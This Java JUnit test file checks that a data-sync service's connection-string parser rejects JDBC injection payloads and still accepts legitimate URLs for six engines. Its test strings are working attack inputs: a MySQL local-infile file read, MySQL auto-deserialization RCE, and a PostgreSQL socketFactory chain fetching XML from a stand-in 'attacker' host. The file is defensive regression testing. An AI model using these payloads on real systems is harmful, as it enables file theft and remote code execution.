package com.synctask.service;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 连接串解析的端到端注入判据。
 *
 * <p>{@link JdbcUrlSafetyTest} 守的是闸门本身，这里守的是**闸门确实装在了解析路径上**——
 * 两者缺一不可：工具类再严，只要 {@code parseConnection} 没调它，注入照样通。
 *
 * <p>下面三条 payload 在 2026-08-19 的审查里是<b>实测通过</b>原正则的，
 * 且各自对应一条已知的利用链（任意文件读 / 两条 RCE）。
 */
class ConnectionStringInjectionTest {

    /** parseConnection 不碰任何注入的依赖，可直接 new 出来测。 */
    private final MetadataService svc = new MetadataService();

    @Test
    @DisplayName("MySQL allowLoadLocalInfile 注入被拒（原可读走 agent 主机任意文件）")
    void rejectsLoadLocalInfile() {
        assertThrows(IllegalArgumentException.class, () -> svc.parseConnection(
                "mysql://u:p@10.0.0.9:3306/db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true"));
    }

    @Test
    @DisplayName("PostgreSQL socketFactory 注入被拒（原为 RCE）")
    void rejectsSocketFactory() {
        assertThrows(IllegalArgumentException.class, () -> svc.parseConnection(
                "postgresql://u:p@10.0.0.9:5432/db?socketFactory=org.springframework.context"
                        + ".support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker/x.xml"));
    }

    @Test
    @DisplayName("MySQL autoDeserialize + queryInterceptors 注入被拒（原为 RCE）")
    void rejectsAutoDeserialize() {
        assertThrows(IllegalArgumentException.class, () -> svc.parseConnection(
                "mysql://u:p@10.0.0.9:3306/db?autoDeserialize=true&queryInterceptors="
                        + "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"));
    }

    @Test
    @DisplayName("主机位注入同样被拒")
    void rejectsHostInjection() {
        assertThrows(IllegalArgumentException.class, () -> svc.parseConnection(
                "mysql://u:p@10.0.0.9/x?allowLoadLocalInfile=true#:3306/db"));
    }

    @Test
    @DisplayName("正常连接串不受影响——六种引擎前缀都要能解出来")
    void acceptsLegitimateConnectionStrings() {
        var mysql = svc.parseConnection("mysql://root:rootpassword@127.0.0.1:33306/sync_task_db");
        assertEquals("127.0.0.1", mysql.host);
        assertEquals(33306, mysql.port);
        assertEquals("sync_task_db", mysql.database);

        var pg = svc.parseConnection("postgresql://pg:pw@db-01.internal.example.com:5432/appdb");
        assertEquals("db-01.internal.example.com", pg.host);
        assertTrue(pg.isPostgresql());

        var oracle = svc.parseConnection("oracle://testuser:pw@127.0.0.1:1521/ORCLPDB1");
        assertEquals("ORCLPDB1", oracle.database);
        assertTrue(oracle.isOracle());

        // Mongo 的任务连接串形态是 mongodb://user:pass@host:port（不带查询串，
        // authSource/directConnection 由后端自己拼），这里确认它仍然解得开
        var mongo = svc.parseConnection("mongodb://root:rootpassword@127.0.0.1:27117");
        assertTrue(mongo.isMongo());
        assertEquals(27117, mongo.port);

        // Redis 的实际形态带用户名（见 autotest/framework/endpoints.py:542）
        assertDoesNotThrow(() -> svc.parseConnection("redis://default:pw@127.0.0.1:6390"));
        assertDoesNotThrow(() -> svc.parseConnection("elastic://elastic:espassword@127.0.0.1:9200"));
    }

    @Test
    @DisplayName("不带库名的连接串仍然合法（先连上再切库的链路）")
    void acceptsConnectionWithoutDatabase() {
        var c = svc.parseConnection("mysql://root:pw@127.0.0.1:3306");
        assertEquals("127.0.0.1", c.host);
        assertNull(c.database);
    }
}
